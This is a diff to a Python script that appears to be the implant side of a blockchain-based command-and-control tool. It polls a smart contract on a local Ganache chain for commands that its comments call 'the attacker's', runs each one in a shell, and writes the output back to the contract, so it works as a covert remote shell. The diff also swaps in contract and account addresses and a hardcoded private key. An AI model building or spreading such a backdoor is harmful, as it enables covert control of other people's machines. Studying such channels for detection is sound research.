@@ -9,6 +9,7 @@
 import os
 from web3 import Web3
 import time
+import subprocess
 
 # Constants.
 SOLIDITY_VERSION = "0.6.0"
@@ -57,6 +58,13 @@ CONTRACT_ABI = [
         "type": "function",
     },
     {
+        "inputs": [],
+        "name": "ResetOutput",
+        "outputs": [],
+        "stateMutability": "nonpayable",
+        "type": "function",
+    },
+    {
         "inputs": [{"internalType": "string", "name": "command_", "type": "string"}],
         "name": "SetCommand",
         "outputs": [],
@@ -79,21 +87,12 @@ CONTRACT_ABI = [
         "stateMutability": "nonpayable",
         "type": "function",
     },
-    {
-        "inputs": [
-            {"internalType": "uint256", "name": "isOutputReady_", "type": "uint256"}
-        ],
-        "name": "SetisOutputReady",
-        "outputs": [],
-        "stateMutability": "nonpayable",
-        "type": "function",
-    },
 ]
 GANACHE_SERVICE = "HTTP://127.0.0.1:7545"
 CHAIN_ID = 1337
-CONTRACT_ADDR = "0x97223459512580e95fC25051e52e064667394Daf"
-ACCOUNT0_ADDR = "0xF3CDd4Dc0aFEBA02741d33092899da869cb196a2"
-PRIVATE_KEY = "0x8d01ec48ed1fb60d5108addceaedf0a4eea0e484674876a0f59189da67180af1"
+CONTRACT_ADDR = "0xb2e9d407c4f8534e80c6a713094633DC57FCA2D4"
+ACCOUNT0_ADDR = "0xf7061ea20Efd6c675b18Ef21F8c4b4cca6996E77"
+PRIVATE_KEY = "0x719f7108fa4d0b6d3d53353a8e9f1b9a63f3beff6014ee511e2772b8ef61117a"
 
 # Initialize the web3 provider object.
 W3_ENGINE = Web3(Web3.HTTPProvider(GANACHE_SERVICE))
@@ -118,25 +117,18 @@ def main():
 
         # If the attacker wants to change directory, change.
         if command.lower().split(" ")[0] == "cd" and len(command.split(" ")) != 1:
-            os.chdir(
-                " ".join(command.split(" ")[1:])
-            )  ### ~~~~~~~~~~~~~ Might not work. didn't test this yet but im tired af.
+            os.chdir(" ".join(command.split(" ")[1:]))
 
         # If the attacker wants to know the current working directory.
         elif command.lower() == "pwd":
-            output = (
-                os.getcwd()
-            )  ### ~~~~~~~~~~~~~ Might not work. didn't test this yet but im tired af.
+            output = os.getcwd()
 
         # Run command.
         else:
-            output = os.popen(command).read()
+            output = subprocess.getoutput(command)
 
-        # Send output.
+        # Send output and set isOutputReady to true.
         SetOutput(output)
-
-        # Set isOutputReady to true.
-        SetisOutputReady(1)
 
 
 # SetOutput() executes a transaction to set output variable.
@@ -151,14 +143,6 @@ def SetOutput(output):
 def SetisCommandReady(arg):
     return RunTransaction(
         "SetisCommandReady",
-        [arg],
-    )
-
-
-# Executes a transaction to set isOutputReady variable.
-def SetisOutputReady(arg):
-    return RunTransaction(
-        "SetisOutputReady",
         [arg],
     )
 
